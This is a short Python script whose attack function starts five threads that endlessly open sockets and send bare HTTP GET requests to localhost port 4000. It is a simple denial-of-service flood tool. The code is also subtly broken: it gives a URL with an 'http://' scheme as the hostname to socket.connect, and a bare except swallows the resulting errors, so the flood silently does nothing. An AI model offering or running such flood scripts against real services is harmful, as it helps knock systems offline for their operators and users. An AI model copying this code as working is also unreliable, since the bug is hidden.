import socket
import threading
target='http://localhost'
port = 4000
def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((target,port))
            s.send(b'GET / HTTP/1.1\r\n\r\n')
            s.close()
        except:
            pass
for i in range(5):
    thread = threading.Thread(target=attack)
    thread.start()